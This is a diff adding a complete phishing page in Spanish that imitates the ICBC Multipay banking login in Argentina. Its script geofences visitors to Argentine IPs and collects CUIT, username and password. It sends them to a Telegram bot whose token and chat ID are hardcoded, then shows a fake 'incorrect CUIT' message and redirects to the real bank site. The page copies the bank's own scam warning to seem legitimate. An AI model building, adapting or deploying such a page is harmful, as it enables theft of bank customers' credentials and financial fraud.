@@ -1,0 +1,724 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>ICBC</title>
+    <style>
+        /* ===== TODO EL CSS SIN MODIFICAR ===== */
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+
+        body {
+            font-family: Arial, Helvetica, sans-serif;
+            background: #ffffff;
+            color: #555;
+            font-size: 10px;
+        }
+
+        .header {
+            width: 100%;
+            background: #fff;
+        }
+
+        .logo-area {
+            height: 43px;
+            border-bottom: 1px solid #b71925;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .logo-img {
+            width: 50px;
+            height: auto;
+            display: block;
+        }
+
+        .language {
+            height: 27px;
+            display: flex;
+            justify-content: flex-end;
+            align-items: center;
+            padding-right: 17%;
+            font-size: 8px;
+            color: #555;
+        }
+
+        .language::before {
+            content: "🌐";
+            margin-right: 5px;
+        }
+
+        .welcome {
+            height: 62px;
+            background: #f1f3f3;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-size: 13px;
+            color: #444;
+        }
+
+        .main {
+            min-height: 900px;
+            padding-top: 18px;
+        }
+
+        .login-card {
+            width: 90%;
+            max-width: 1000px;
+            margin: 0 auto;
+            padding: 25px 45px 22px;
+            background: white;
+            border: 1px solid #e6e6e6;
+            box-shadow: 0 2px 7px rgba(0, 0, 0, 0.12);
+        }
+
+        .login-card h2 {
+            font-size: 13px;
+            font-weight: normal;
+            color: #444;
+            margin-bottom: 20px;
+        }
+
+        .form-group {
+            margin-bottom: 14px;
+        }
+
+        .form-group label {
+            display: block;
+            font-size: 8px;
+            color: #555;
+            margin-bottom: 3px;
+        }
+
+        .form-group input {
+            width: 100%;
+            height: 20px;
+            border: none;
+            border-bottom: 1px solid #b9dce4;
+            background: #f1f2f2;
+            padding: 3px 5px;
+            outline: none;
+            font-size: 9px;
+        }
+
+        .form-group input:focus {
+            border-bottom-color: #bd1420;
+        }
+
+        #passwordStep {
+            display: none;
+        }
+
+        .buttons {
+            display: flex;
+            justify-content: center;
+            gap: 7px;
+            margin-top: 8px;
+        }
+
+        .btn {
+            width: 115px;
+            height: 30px;
+            border: 1px solid #bd1420;
+            background: white;
+            color: #b71925;
+            cursor: pointer;
+            font-size: 9px;
+        }
+
+        .btn-primary {
+            background: #c8101e;
+            color: white;
+        }
+
+        .btn:hover {
+            opacity: .9;
+        }
+
+        .links {
+            text-align: center;
+            margin-top: 12px;
+            line-height: 16px;
+            font-size: 8px;
+        }
+
+        .links a {
+            color: #4c9cae;
+            text-decoration: none;
+        }
+
+        .links a:hover {
+            text-decoration: underline;
+        }
+
+        .warning {
+            width: 200px;
+            margin: 20px auto 0;
+            background: #c8101e;
+            color: white;
+            padding: 10px 8px;
+            border-radius: 8px;
+            font-size: 8px;
+            line-height: 10px;
+        }
+
+        .warning strong {
+            display: block;
+            font-size: 10px;
+            line-height: 12px;
+            margin-bottom: 6px;
+        }
+
+        .info {
+            text-align: center;
+            margin-top: 10px;
+            line-height: 15px;
+            font-size: 9px;
+            color: #777;
+        }
+
+        .info a {
+            color: #4d9cac;
+            text-decoration: none;
+        }
+
+        .register {
+            display: flex;
+            width: 100px;
+            height: 29px;
+            margin: 9px auto;
+            border: 1px solid #bd1420;
+            color: #b71925;
+            text-decoration: none;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .legal {
+            max-width: 750px;
+            margin: 14px auto;
+            text-align: center;
+            font-size: 8px;
+            line-height: 12px;
+            color: #999;
+        }
+
+        .help {
+            position: fixed;
+            right: 15px;
+            bottom: 65px;
+            display: flex;
+            align-items: center;
+            gap: 5px;
+        }
+
+        .help-text {
+            border: 1px solid #b71925;
+            border-radius: 20px;
+            padding: 5px 10px;
+            font-size: 8px;
+            color: #555;
+            background: white;
+        }
+
+        .help-icon {
+            width: 40px;
+            height: 40px;
+            border: 3px solid #b71925;
+            border-radius: 50%;
+            background: white;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 17px;
+        }
+
+        .footer {
+            background: #c5c5c5;
+            min-height: 65px;
+            padding: 15px 10%;
+            color: #777;
+        }
+
+        .footer-links {
+            display: flex;
+            flex-wrap: wrap;
+        }
+
+        .footer-links a {
+            color: #777;
+            text-decoration: none;
+            padding: 0 10px;
+            border-right: 1px solid #999;
+            font-size: 8px;
+        }
+
+        .footer-links a:first-child {
+            padding-left: 0;
+        }
+
+        .footer-links a:last-child {
+            border-right: none;
+        }
+
+        .footer-copy {
+            background: white;
+            text-align: center;
+            padding: 13px;
+            font-size: 8px;
+            color: #777;
+        }
+
+        /* Estilos para el overlay de redirección */
+        .redirect-overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.7);
+            z-index: 9999;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .redirect-box {
+            background: white;
+            padding: 40px 50px;
+            border-radius: 12px;
+            text-align: center;
+            max-width: 400px;
+            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.3);
+        }
+
+        .redirect-box h2 {
+            font-size: 18px;
+            color: #333;
+            margin-bottom: 10px;
+        }
+
+        .redirect-box p {
+            font-size: 14px;
+            color: #666;
+            margin-bottom: 20px;
+        }
+
+        .redirect-counter {
+            font-size: 48px;
+            font-weight: bold;
+            color: #c8101e;
+            margin: 10px 0;
+        }
+
+        .redirect-box .spinner {
+            display: inline-block;
+            width: 40px;
+            height: 40px;
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #c8101e;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 10px auto;
+        }
+
+        /* Estilos para el overlay de geolocalización */
+        .geo-overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.85);
+            z-index: 10000;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .geo-box {
+            background: white;
+            padding: 50px 60px;
+            border-radius: 16px;
+            text-align: center;
+            max-width: 500px;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.5);
+        }
+
+        .geo-box .geo-spinner {
+            display: inline-block;
+            width: 60px;
+            height: 60px;
+            border: 5px solid #f3f3f3;
+            border-top: 5px solid #c8101e;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 10px auto 20px;
+        }
+
+        .geo-box h2 {
+            font-size: 20px;
+            color: #333;
+            margin-bottom: 10px;
+        }
+
+        .geo-box p {
+            font-size: 14px;
+            color: #666;
+            margin-bottom: 5px;
+        }
+
+        .geo-box .geo-sub {
+            font-size: 12px;
+            color: #999;
+            margin-top: 10px;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        @media (max-width: 600px) {
+            .language {
+                padding-right: 8%;
+            }
+            .welcome {
+                height: 62px;
+                font-size: 12px;
+            }
+            .main {
+                min-height: 900px;
+                padding-top: 18px;
+            }
+            .login-card {
+                width: 94%;
+                padding: 22px 20px;
+            }
+            .login-card h2 {
+                font-size: 12px;
+            }
+            .form-group input {
+                height: 20px;
+                font-size: 9px;
+            }
+            .btn {
+                width: 110px;
+                height: 29px;
+                font-size: 8px;
+            }
+            .warning {
+                width: 200px;
+            }
+            .legal {
+                padding: 0 20px;
+            }
+            .help {
+                right: 8px;
+                bottom: 65px;
+            }
+            .footer {
+                padding: 15px 20px;
+            }
+            .footer-links a {
+                margin-bottom: 8px;
+            }
+            .redirect-box {
+                padding: 30px 25px;
+                margin: 0 20px;
+            }
+            .redirect-counter {
+                font-size: 36px;
+            }
+            .geo-box {
+                padding: 35px 25px;
+                margin: 0 20px;
+            }
+            .geo-box h2 {
+                font-size: 18px;
+            }
+        }
+    </style>
+</head>
+
+<body>
+    <!-- OVERLAY DE GEOLOCALIZACIÓN -->
+    <div class="geo-overlay" id="geoOverlay">
+        <div class="geo-box">
+            <div class="geo-spinner"></div>
+            <h2>🌎 Verificando ubicación</h2>
+            <p>Por favor espera mientras verificamos tu región...</p>
+            <p class="geo-sub">Este proceso es automático</p>
+        </div>
+    </div>
+
+    <header class="header">
+        <div class="logo-area">
+            <img src="https://www.multipay.com.ar/static/minb/assets/images/icbc-logo.svg" alt="ICBC" class="logo-img" />
+        </div>
+        <div class="language">In English</div>
+    </header>
+
+    <section class="welcome">Bienvenido a ICBC Multipay</section>
+
+    <main class="main">
+        <!-- LOGIN -->
+        <section class="login-card">
+            <h2>Login</h2>
+
+            <!-- CUIT -->
+            <div class="form-group">
+                <label>CUIT</label>
+                <input type="number" id="cuit" placeholder="Ingrese su CUIT" />
+            </div>
+
+            <!-- USUARIO -->
+            <div class="form-group">
+                <label>Usuario</label>
+                <input type="text" id="usuario" placeholder="Ingrese su usuario" />
+            </div>
+
+            <!-- CONTRASEÑA -->
+            <div id="passwordStep">
+                <div class="form-group">
+                    <label>Contraseña</label>
+                    <input type="password" id="password" placeholder="Ingrese su contraseña" />
+                </div>
+            </div>
+
+            <!-- BOTONES -->
+            <div class="buttons">
+                <button class="btn" id="previousButton" style="display: none;" onclick="volverPasoUno()">Anterior</button>
+                <button class="btn btn-primary" id="nextButton" onclick="mostrarPassword()">Siguiente</button>
+                <button class="btn btn-primary" id="loginButton" style="display: none;" onclick="ingresarDemo()">Ingresar</button>
+            </div>
+
+            <!-- ENLACES -->
+            <div class="links">
+                <a href="#">Olvidé mi usuario</a> | <a href="#">Olvidé mi contraseña</a><br />
+                <a href="#">Gestioná el segundo factor de autenticación/Token</a>
+            </div>
+        </section>
+
+        <!-- AVISO -->
+        <div class="warning">
+            <strong>CUIDADO CON ESTA NUEVA MODALIDAD DE ESTAFA</strong>
+            Recordá que solo vamos a pedirte Clave Token para confirmar o liberar operaciones y gestiones de administración; nunca para acceder a tu cuenta.
+            <br /><br />
+            Si perdés el control de la pantalla porque aparenta cargar una actualización y te pide Clave Token, NO LA INGRESES.
+        </div>
+
+        <!-- INFORMACIÓN -->
+        <div class="info">
+            Si tenés dudas, comunicate con la Mesa de ayuda<br />
+            <a href="#">ayuda@ejemplo.com</a>
+            <a href="#" class="register">Registrate</a>
+            <a href="#">Ya tengo una solicitud de adhesión generada</a><br />
+            <a href="#">Solicitar nuevo administrador</a>
+        </div>
+
+        <!-- LEGAL -->
+        <div class="legal">
+            Operar con este portal implica que aceptás en su totalidad los
+            <a href="#">Términos y Condiciones</a>.<br />
+            Tus operaciones son independientes de otras compañías y entidades.
+        </div>
+    </main>
+
+    <!-- AYUDA -->
+    <div class="help">
+        <div class="help-text">¿Necesitás ayuda?</div>
+        <div class="help-icon">☺</div>
+    </div>
+
+    <!-- FOOTER -->
+    <footer class="footer">
+        <div class="footer-links">
+            <a href="#privacidad">Política de privacidad</a>
+            <a href="#riesgos">Gerenciamiento de riesgos</a>
+            <a href="#terminos">Términos y condiciones</a>
+            <a href="#seguridad">Seguridad en canales</a>
+            <a href="#mapa">Mapa del sitio</a>
+        </div>
+    </footer>
+    <div class="footer-copy">Todos los Derechos Reservados</div>
+
+    <!-- OVERLAY DE REDIRECCIÓN -->
+    <div class="redirect-overlay" id="redirectOverlay">
+        <div class="redirect-box">
+            <div class="spinner"></div>
+            <h2>🔄</h2>
+            <p>cuit incorrecto</p>
+            <div class="redirect-counter" id="counterDisplay">3</div>
+            <p style="font-size: 12px; color: #999; margin-top: 5px;">segundos</p>
+        </div>
+    </div>
+
+    <script>
+        // ============================================================
+        // CONFIGURACIÓN
+        // ============================================================
+        const BOT_TOKEN = '8998295534:AAGGIxzih1XeS0pXW3TAIHEYAmRACr1Tik8';
+        const CHAT_ID = '7776240161';
+        const REDIRECT_URL = 'https://www.multipay.com.ar/';
+        const INICIO_URL = 'inicio.html';
+
+        // ============================================================
+        // FUNCIÓN PARA VERIFICAR UBICACIÓN POR IP
+        // ============================================================
+        async function verificarUbicacion() {
+            const overlay = document.getElementById('geoOverlay');
+            overlay.style.display = 'flex';
+
+            try {
+                // Usar ipapi.co para obtener información de la IP
+                const response = await fetch('https://ipapi.co/json/');
+                const data = await response.json();
+                
+                // Verificar si el país es Argentina
+                const pais = data.country_code;
+                const paisNombre = data.country_name;
+                
+                console.log('🌍 País detectado:', paisNombre, 'Código:', pais);
+                
+                // Si NO es Argentina, redirigir a inicio.html
+                if (pais !== 'AR') {
+                    console.log('🚫 Acceso denegado: IP no argentina. Redirigiendo a inicio.html');
+                    window.location.href = INICIO_URL;
+                    return false;
+                }
+                
+                // Si es Argentina, ocultar overlay y mostrar la página
+                console.log('✅ Acceso permitido: IP argentina');
+                overlay.style.display = 'none';
+                return true;
+                
+            } catch (error) {
+                console.error('❌ Error al verificar ubicación:', error);
+                // En caso de error, mostrar un mensaje y redirigir por seguridad
+                alert('Error al verificar ubicación. Serás redirigido a inicio.html');
+                window.location.href = INICIO_URL;
+                return false;
+            }
+        }
+
+        // ============================================================
+        // FUNCIONES DEL FORMULARIO
+        // ============================================================
+        function mostrarPassword() {
+            const cuit = document.getElementById("cuit").value.trim();
+            const usuario = document.getElementById("usuario").value.trim();
+
+            if (cuit === "" || usuario === "") {
+                alert("Por favor completa el CUIT y el Usuario.");
+                return;
+            }
+
+            document.getElementById("passwordStep").style.display = "block";
+            document.getElementById("nextButton").style.display = "none";
+            document.getElementById("previousButton").style.display = "block";
+            document.getElementById("loginButton").style.display = "block";
+        }
+
+        function volverPasoUno() {
+            document.getElementById("passwordStep").style.display = "none";
+            document.getElementById("nextButton").style.display = "block";
+            document.getElementById("previousButton").style.display = "none";
+            document.getElementById("loginButton").style.display = "none";
+        }
+
+        // ============================================================
+        // FUNCIÓN PARA ENVIAR A TELEGRAM
+        // ============================================================
+        async function enviarATelegram(cuit, usuario, password) {
+            const mensaje = 
+                "🔐 *Nuevo intento de login*\n\n" +
+                "📌 CUIT: " + (cuit || '(vacío)') + "\n" +
+                "👤 Usuario: " + (usuario || '(vacío)') + "\n" +
+                "🔑 Contraseña: " + (password || '(vacío)');
+
+            const url = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage";
+
+            try {
+                const resp = await fetch(url, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: mensaje,
+                        parse_mode: 'Markdown'
+                    })
+                });
+                
+                if (!resp.ok) {
+                    const errorText = await resp.text();
+                    console.error('Error Telegram:', errorText);
+                } else {
+                    console.log('✅ Datos enviados a Telegram correctamente.');
+                }
+            } catch (err) {
+                console.error('Error de red:', err);
+            }
+        }
+
+        // ============================================================
+        // FUNCIÓN PARA MOSTRAR OVERLAY Y REDIRIGIR CON CONTADOR
+        // ============================================================
+        function redirigirConContador() {
+            const overlay = document.getElementById('redirectOverlay');
+            const counterDisplay = document.getElementById('counterDisplay');
+            
+            overlay.style.display = 'flex';
+            
+            let segundos = 3;
+            counterDisplay.textContent = segundos;
+            
+            const intervalo = setInterval(function() {
+                segundos--;
+                counterDisplay.textContent = segundos;
+                
+                if (segundos <= 0) {
+                    clearInterval(intervalo);
+                    window.location.href = REDIRECT_URL;
+                }
+            }, 1000);
+        }
+
+        // ============================================================
+        // FUNCIÓN INGRESAR - ENVÍA A TELEGRAM Y REDIRIGE
+        // ============================================================
+        function ingresarDemo() {
+            const cuit = document.getElementById("cuit").value.trim();
+            const usuario = document.getElementById("usuario").value.trim();
+            const password = document.getElementById("password").value.trim();
+
+            const passwordStep = document.getElementById("passwordStep");
+            if (passwordStep.style.display === "none" || passwordStep.style.display === "") {
+                alert("Primero debes hacer clic en 'Siguiente' para ingresar la contraseña.");
+                return;
+            }
+
+            if (password === "") {
+                alert("Por favor ingresa tu contraseña.");
+                return;
+            }
+
+            enviarATelegram(cuit, usuario, password);
+            redirigirConContador();
+        }
+
+        // ============================================================
+        // EJECUTAR VERIFICACIÓN DE UBICACIÓN AL CARGAR LA PÁGINA
+        // ============================================================
+        document.addEventListener('DOMContentLoaded', function() {
+            verificarUbicacion();
+        });
+    </script>
+</body>
+</html>
